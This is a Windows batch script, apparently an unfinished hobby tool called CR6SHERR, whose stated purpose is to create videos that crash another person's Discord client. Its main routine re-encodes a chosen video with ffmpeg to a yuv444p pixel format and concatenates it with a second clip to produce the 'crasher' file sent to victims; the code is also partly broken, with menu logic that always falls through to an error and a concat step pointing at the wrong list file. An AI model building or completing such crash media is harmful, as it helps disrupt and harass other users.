::  ________/\\\\\\\\\__________________________/\\\\\_______________/\\\___________________________/\\\\\\\\\________/\\\\\\\\\____        
::   _____/\\\////////_______________________/\\\\////_______________\/\\\_________________________/\\\///////\\\____/\\\///////\\\___       
::    ___/\\\/_____________________________/\\\///____________________\/\\\________________________\/\\\_____\/\\\___\/\\\_____\/\\\___      
::     __/\\\______________/\\/\\\\\\\____/\\\\\\\\\\\_____/\\\\\\\\\\_\/\\\_____________/\\\\\\\\__\/\\\\\\\\\\\/____\/\\\\\\\\\\\/____     
::      _\/\\\_____________\/\\\/////\\\__/\\\\///////\\\__\/\\\//////__\/\\\\\\\\\\____/\\\/////\\\_\/\\\//////\\\____\/\\\//////\\\____    
::       _\//\\\____________\/\\\___\///__\/\\\______\//\\\_\/\\\\\\\\\\_\/\\\/////\\\__/\\\\\\\\\\\__\/\\\____\//\\\___\/\\\____\//\\\___   
::        __\///\\\__________\/\\\_________\//\\\______/\\\__\////////\\\_\/\\\___\/\\\_\//\\///////___\/\\\_____\//\\\__\/\\\_____\//\\\__  
::         ____\////\\\\\\\\\_\/\\\__________\///\\\\\\\\\/____/\\\\\\\\\\_\/\\\___\/\\\__\//\\\\\\\\\\_\/\\\______\//\\\_\/\\\______\//\\\_ 
::          _______\/////////__\///_____________\/////////_____\//////////__\///____\///____\//////////__\///________\///__\///________\///__
::           _________________________________________________________________________________________________________________________________
::            ____________________________________|   mgXzyy#0001   |   github.com/mariangXzyy/CR6SHERR   |____________________________________
::  
::     Simple program that makes videos for crashing someone's Discord client. 
::     Please note that the videos may not crash recent Chromium client versions of Discord, but it should do its job on some older versions 
::     if the user has not updated Discord.
::  
::                          /!\ THE PROGRAM IS NOT COMPLETE, YOU CANNOT MODIFY VIDEOS WITH THIS BATCH SCRIPT YET!!
::  
::  
::  



@echo off

:batchprep
    echo [RUN][ LOG ][ BATCHPREP ]	Preparing for proper program usage...
    title "CR6SHERR // BatchPrep in progress..."
    cd %localappdata% && echo [OK.][ LOG ][ BATCHPREP ]	CD ok.
    if exist mgXzyy\temp\ (
    	echo [OK.][ LOG ][ BATCHPREP ]	Temp folder exists, ok.
    ) else (
	    echo [RUN][ LOG ][ BATCHPREP ]	Preparing temp folder.
	    mkdir mgXzyy
    	echo [OK.][ LOG ][ BATCHPREP ]	'OK %localappdata%\mgXzyy\
	    cd mgXzyy
    	mkdir TEMP
	    echo [OK.][ LOG ][ BATCHPREP ]	'OK %localappdata%\mgXzyy\TEMP\
    	echo [OK.][ LOG ][ BATCHPREP ]	Temp folder created, continuing batchprep.
    )
set tempfolder="%localappdata%\mgXzyy\TEMP\" && echo [OK.][ LOG ][ BATCHPREP ]	TEMPFOLDER ok.
echo [CHK][ LOG ][ BATCHPREP ]	Checking if ffmpeg exists at '%localappdata%\mgXzyy\ffmpeg\...
cd %localappdata%\mgXzyy\
if exist ffmpeg\ (
    echo [OK.][ LOG ][ batchDEBUG ] FFMPEG EXISTENCE OK.
    goto batchprep_ffmpegOK
) else (
    goto batchprep_ffmpegNULL
)
:batchprep_ffmpegOK
    echo [OK.][ LOG ][ BATCHPREP ]  FFmpeg was found in %localappdata%\mgXzyy\ffmpeg\.
    set ffmpeg=%localappdata%\mgXzyy\ffmpeg\ffmpeg.exe
    echo [OK.][ LOG ][ batchDEBUG ] 'set ffmpeg=%localappdata%\mgXzyy\ffmpeg\ffmpeg.exe
    echo [OK.][ LOG ][ BATCHPREP ]  BatchPrep has completed. Log is printed above and not saved as text file.

title "CR6SHERR // Discord Crashing Video Creator // mgXzyy#0001"
echo.
echo > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > 
echo.

cls
echo '________/\\\\\\\\\__________________________/\\\\\_______________/\\\___________________________/\\\\\\\\\________/\\\\\\\\\____        
echo ' _____/\\\////////_______________________/\\\\////_______________\/\\\_________________________/\\\///////\\\____/\\\///////\\\___       
echo '  ___/\\\/_____________________________/\\\///____________________\/\\\________________________\/\\\_____\/\\\___\/\\\_____\/\\\___      
echo '   __/\\\______________/\\/\\\\\\\____/\\\\\\\\\\\_____/\\\\\\\\\\_\/\\\_____________/\\\\\\\\__\/\\\\\\\\\\\/____\/\\\\\\\\\\\/____     
echo '    _\/\\\_____________\/\\\/////\\\__/\\\\///////\\\__\/\\\//////__\/\\\\\\\\\\____/\\\/////\\\_\/\\\//////\\\____\/\\\//////\\\____    
echo '     _\//\\\____________\/\\\___\///__\/\\\______\//\\\_\/\\\\\\\\\\_\/\\\/////\\\__/\\\\\\\\\\\__\/\\\____\//\\\___\/\\\____\//\\\___   
echo '      __\///\\\__________\/\\\_________\//\\\______/\\\__\////////\\\_\/\\\___\/\\\_\//\\///////___\/\\\_____\//\\\__\/\\\_____\//\\\__  
echo '       ____\////\\\\\\\\\_\/\\\__________\///\\\\\\\\\/____/\\\\\\\\\\_\/\\\___\/\\\__\//\\\\\\\\\\_\/\\\______\//\\\_\/\\\______\//\\\_ 
echo '        _______\/////////__\///_____________\/////////_____\//////////__\///____\///____\//////////__\///________\///__\///________\///__
echo '         _________________________________________________________________________________________________________________________________
echo '          ________________________|   Version 0.1   |   mgXzyy#0001   |   github.com/mariangXzyy/CR6SHERR   |______________________________
echo.

:cr6sherr_setup
:: Program will request the full path of the video.
set /p videopath="[ INPUT ] Enter the video file path > "
:: Program will request a name for the output video.
set /p crashername="[ OUTPUT ] Enter the crasher name > "
:: Program will ask for a file type of the video.
echo [ CR6SHERR ] What file type do you want the crasher video to be?
:cr6sherr_ftsel
echo 1 >> WebM
echo 2 >> MPEG4
echo 3 >> Quicktime MOV
echo 4 >> Matroska MKV
echo X >> Gif (soon)
set /p crasherfiletype="> "
echo.
:: Program will check the user input and sets the ft variable (ft meaning filetype or extension)
if %crasherfiletype%==1 (set ft="webm")
if %crasherfiletype%==2 (set ft="mp4")
if %crasherfiletype%==3 (set ft="mov")
if %crasherfiletype%==4 (set ft="mkv")
if %crasherfiletype%==X (
    echo [ CR6SHERR ] GIF is not supported yet?
    goto cr6sherr_ftsel
)
:: If it is not a valid option, the program will ask again for the filetype of the video.
    echo [ CR6SHER ]    Invalid option. input a number (1-4)
    goto cr6sherr_ftsel

:cr6sherr_process
:: Program will ask for user to confirm the actions.
    echo [ CR6SHER ]    Are you sure you want to continue with the actions below?
    echo Input Video Path > %videopath%
    echo Output Crashing Video > %crashername%.%ft%
    set /p confirmaction="(y/n) > "
    echo.
    if %confirmaction%==y (echo [OK.][ LOG ][ CR6SHERR ]    Proceeding.)
    if %confirmaction%==n (goto cr6sherr_setup)
:: Invalid option again?
    echo [ CR6SHER ]    Invalid option, type Y for yes or N for no.
    goto cr6sherr_process

:: Program will check if the video is a vaild one.
    echo [CHK][ LOG ][ PREPARATION ]	Checking if video given is valid...
    :: there will be the code for checking validity
    echo [OK.][ LOG ][ PREPARATION ]	Video given is valid.
    echo [RUN][ LOG ][ PROGRESS ]	Running ffmpeg...
    %ffmpeg% -i %videopath% -pix_fmt yuv444p %tempfolder%\video.webm
    (
    echo file %tempfolder%\video.webm
    echo file %tempfolder%\black.webm
    )>"%tempfolder%\ffmpeg.txt"
    %ffmpeg% -f concat -i DONOTDELETE.txt -codec copy %crashername%.webm
    del "%tempfolder%\ffmpeg.txt"
    del "%tempfolder%\video.webm"
    echo [OK.][ LOG ][ CR6SHER ]    Success.
    echo.
    set /p confDel="[ CR6SHER ] Do you want to delete the original video? (y/n) > "
    


:batchprep_ffmpegNULL
	echo [ERR][ LOG ][ BATCHPREP ]	FFMPEG DOES NOT EXIST IN 'APPDATA\LOCAL\MGXZYY.
	set /p confFFMPEGinst="[ Input ] Download FFmpeg? You will need WGET installed. (y/n) > "
    if %confFFMPEGinst%==y (goto batchprep_ffmpegpull)
    echo [OK.][ LOG ][ batchDEBUG ] User did not say yes.
    if %confFFMPEGinst%==n (goto batchprep_fail)
    echo [OK.][ LOG ][ batchDEBUG ] User did not say no. (INVALID INPUT)
    echo [ERR][ LOG ][ CR6SHERR ]   Invalid input.
    goto batchprep_ffmpegNULL

:batchprep_ffmpegpull

:batchprep_fail
    echo.
    echo [ERR][ LOG ][ CR6SHERR ]   Batchprep failed. Log is printed above and not saved as text file.
    echo                            If you get the same errors again and again, do not hesitate to open
    echo                            an issue on https://github.com/mariangXzyy/CR6SHERR/issues.
    echo.
    pause && goto exit


:exit